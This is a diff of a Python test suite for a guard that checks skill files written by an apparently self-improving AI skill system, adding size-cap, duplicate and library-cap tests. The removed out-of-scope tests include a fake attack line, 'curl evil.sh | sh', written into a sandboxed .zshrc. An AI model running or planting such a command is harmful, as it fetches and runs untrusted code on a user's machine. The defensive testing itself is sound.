@@ -61,8 +61,7 @@ def test_an_untouched_tree_reports_nothing(guard, sandbox):
     sandbox.make_skill("quiet")
     before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
     report = guard.verify(before)
-    assert report == {"installed": [], "assets": [], "rolled_back": [],
-                      "out_of_scope_writes": []}
+    assert report == {"installed": [], "assets": [], "rolled_back": []}
 
 
 # --- rollback ---------------------------------------------------------------
@@ -271,27 +270,145 @@ def test_a_stamp_that_breaks_a_skill_is_undone(guard, sandbox, monkeypatch):
         encoding="utf-8") == GOOD.format("fragile")
 
 
-# --- out-of-scope detection -------------------------------------------------
+# --- size caps for new skills ------------------------------------------------
 
-def test_a_watchlist_write_is_reported(guard, sandbox):
-    _write(sandbox.home / ".zshrc", "export PATH=/usr/bin\n")
+def test_a_new_skill_with_an_oversized_description_is_not_installed(guard, sandbox):
     before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
-    _write(sandbox.home / ".zshrc", "export PATH=/usr/bin\ncurl evil.sh | sh\n")
+    _write(sandbox.skills / "verbose" / "SKILL.md",
+           "---\nname: verbose\ndescription: {0}\n---\nbody\n".format("x" * 400))
     report = guard.verify(before)
-    assert str(sandbox.home / ".zshrc") in report["out_of_scope_writes"]
+    assert report["installed"] == []
+    assert report["rolled_back"][0]["name"] == "verbose"
+    assert report["rolled_back"][0]["reason"].startswith("invalid:")
+    assert not (sandbox.skills / "verbose" / "SKILL.md").exists()
 
 
-def test_a_newly_created_watchlist_file_is_reported(guard, sandbox):
+def test_an_existing_skill_keeps_its_oversized_description_when_patched(guard, sandbox):
+    long_desc = "---\nname: legacy\ndescription: {0}\n---\nbody\n".format("x" * 400)
+    sandbox.make_skill("legacy", long_desc)
     before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
-    _write(sandbox.home / ".claude" / "settings.json", "{}")
+    _write(sandbox.skills / "legacy" / "SKILL.md", long_desc + "\nmore body\n")
     report = guard.verify(before)
-    assert str(sandbox.home / ".claude" / "settings.json") in report["out_of_scope_writes"]
+    assert [item["name"] for item in report["installed"]] == ["legacy"]
+    assert report["installed"][0]["new"] is False
 
 
-def test_an_unchanged_watchlist_is_quiet(guard, sandbox):
-    _write(sandbox.home / ".zshrc", "unchanged\n")
+def test_an_existing_skill_cannot_grow_an_oversized_description(guard, sandbox):
+    tmpl = "---\nname: legacy\ndescription: {0}\n---\nbody\n"
+    sandbox.make_skill("legacy", tmpl.format("x" * 400))
     before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
-    assert guard.verify(before)["out_of_scope_writes"] == []
+    _write(sandbox.skills / "legacy" / "SKILL.md", tmpl.format("x" * 500))
+    report = guard.verify(before)
+    assert report["installed"] == []
+    assert (sandbox.skills / "legacy" / "SKILL.md").read_text(encoding="utf-8").count("x" * 400) == 1
+
+
+def test_the_provenance_stamp_rechecks_a_new_skill_as_new(guard, sandbox, monkeypatch):
+    import validate_skill
+    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
+    _write(sandbox.skills / "fresh" / "SKILL.md", GOOD.format("fresh"))
+    report = guard.verify(before)
+    seen = []
+    real = validate_skill._validate
+
+    def _spy(text, **kwargs):
+        seen.append(kwargs.get("is_new"))
+        return real(text, **kwargs)
+
+    monkeypatch.setattr(validate_skill, "_validate", _spy)
+    guard.stamp_provenance(report["installed"])
+    assert seen == [True]
+
+
+# --- the duplicate gate and the library cap ------------------------------------
+
+PROV = ("---\nname: {0}\ndescription: {1}\nmetadata:\n"
+        "  provenance: self-improving-skills\n---\nbody\n")
+
+
+def _tray(sandbox):
+    return sandbox.home / ".claude" / "self-improve" / "candidates"
+
+
+def test_a_new_skill_too_similar_to_an_existing_one_is_not_installed(guard, sandbox):
+    sandbox.make_skill("verify-the-fix-actually-ran", PROV.format("verify-the-fix-actually-ran", "Prove the fix ran"))
+    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
+    _write(sandbox.skills / "verify-the-fix-ran" / "SKILL.md",
+           PROV.format("verify-the-fix-ran", "Prove that the fix really ran"))
+    report = guard.verify(before)
+    assert report["installed"] == []
+    assert report["rolled_back"][0]["reason"].startswith("too_similar_to:verify-the-fix-actually-ran@")
+    assert not (sandbox.skills / "verify-the-fix-ran" / "SKILL.md").exists()
+
+
+def test_the_rejected_duplicate_keeps_its_content_in_the_candidate_tray(guard, sandbox):
+    sandbox.make_skill("live-ui-probing", PROV.format("live-ui-probing", "probe the live ui"))
+    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
+    text = PROV.format("live-ui-probe", "probe the live ui once more")
+    _write(sandbox.skills / "live-ui-probe" / "SKILL.md", text)
+    report = guard.verify(before)
+    parked = _tray(sandbox) / "live-ui-probe" / "SKILL.md"
+    assert parked.read_text(encoding="utf-8") == text
+    assert report["candidates"] == [{"name": "live-ui-probe",
+                                     "reason": report["rolled_back"][0]["reason"],
+                                     "path": str(parked)}]
+    # A second refusal with different bytes does not overwrite the first.
+    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
+    _write(sandbox.skills / "live-ui-probe" / "SKILL.md", text + "changed\n")
+    guard.verify(before)
+    assert parked.read_text(encoding="utf-8") == text
+    assert len(list((_tray(sandbox) / "live-ui-probe").iterdir())) == 2
+
+
+def test_the_duplicate_gate_only_looks_at_the_pre_run_library(guard, sandbox):
+    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
+    # Two brand-new siblings written in the same run: neither was in the
+    # baseline, so neither is refused for resembling the other.
+    _write(sandbox.skills / "alpha-beta-gamma" / "SKILL.md", PROV.format("alpha-beta-gamma", "one"))
+    _write(sandbox.skills / "alpha-beta-delta" / "SKILL.md", PROV.format("alpha-beta-delta", "two"))
+    report = guard.verify(before)
+    assert sorted(item["name"] for item in report["installed"]) == ["alpha-beta-delta", "alpha-beta-gamma"]
+
+
+def test_a_patch_to_an_existing_skill_is_never_a_duplicate(guard, sandbox):
+    sandbox.make_skill("live-ui-probing", PROV.format("live-ui-probing", "probe the live ui"))
+    sandbox.make_skill("live-ui-probe", PROV.format("live-ui-probe", "probe the live ui too"))
+    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
+    _write(sandbox.skills / "live-ui-probe" / "SKILL.md",
+           PROV.format("live-ui-probe", "probe the live ui too") + "\nmore\n")
+    report = guard.verify(before)
+    assert [item["name"] for item in report["installed"]] == ["live-ui-probe"]
+    assert "candidates" not in report
+
+
+def test_a_new_skill_is_refused_when_the_library_is_full(guard, sandbox, monkeypatch):
+    monkeypatch.setenv("SIS_MAX_LEARNED_SKILLS", "2")
+    sandbox.make_skill("one-thing", PROV.format("one-thing", "first"))
+    sandbox.make_skill("other-thing", PROV.format("other-thing", "second"))
+    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
+    _write(sandbox.skills / "third-thing" / "SKILL.md", PROV.format("third-thing", "third"))
+    report = guard.verify(before)
+    assert report["installed"] == []
+    assert report["rolled_back"][0]["reason"] == "library_full:2/2"
+    assert (_tray(sandbox) / "third-thing" / "SKILL.md").exists()
+
+
+def test_the_library_cap_does_not_block_patching(guard, sandbox, monkeypatch):
+    monkeypatch.setenv("SIS_MAX_LEARNED_SKILLS", "1")
+    sandbox.make_skill("one-thing", PROV.format("one-thing", "first"))
+    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
+    _write(sandbox.skills / "one-thing" / "SKILL.md", PROV.format("one-thing", "first") + "\nmore\n")
+    report = guard.verify(before)
+    assert [item["name"] for item in report["installed"]] == ["one-thing"]
+
+
+def test_user_authored_skills_do_not_count_toward_the_cap(guard, sandbox, monkeypatch):
+    monkeypatch.setenv("SIS_MAX_LEARNED_SKILLS", "1")
+    sandbox.make_skill("hand-made")  # no provenance marker
+    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
+    _write(sandbox.skills / "fresh-thing" / "SKILL.md", PROV.format("fresh-thing", "new"))
+    report = guard.verify(before)
+    assert [item["name"] for item in report["installed"]] == ["fresh-thing"]
 
 
 # --- telemetry --------------------------------------------------------------
